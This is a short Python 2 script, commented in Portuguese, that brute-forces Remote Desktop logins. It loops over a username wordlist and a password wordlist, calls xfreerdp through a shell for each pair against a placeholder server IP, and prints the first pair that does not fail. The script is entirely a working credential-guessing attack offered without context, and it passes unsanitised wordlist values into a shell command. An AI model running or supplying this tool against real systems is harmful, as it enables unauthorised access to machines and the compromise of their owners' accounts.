import subprocess

host = "IP_do_servidor_RDP"
achou = False #1

with open("usuarios.txt", "r") as usuarios: #2
    with open("senhas.txt", "r") as senhas: #3
        while True: #4
            usuario = usuarios.readline().strip("\n") #5
            if not usuario: #6
                break
            while True: #7
                senha = senhas.readline().strip("\n") #8
                if not senha: #9
                    break
                comando = "xfreerdp /u:%s /p:%s /v:%s" %(usuario, senha, host) #10
                cmd = subprocess.Popen(comando, stderr = subprocess.PIPE, shell=True) #11
                if "connection failure" not in cmd.stderr.read(): #12
                    print "USER:", usuario
                    print "PASS:", senha
                    achou = True #13
                    break #14
            if achou: #15
                break
            senhas.seek(0) #16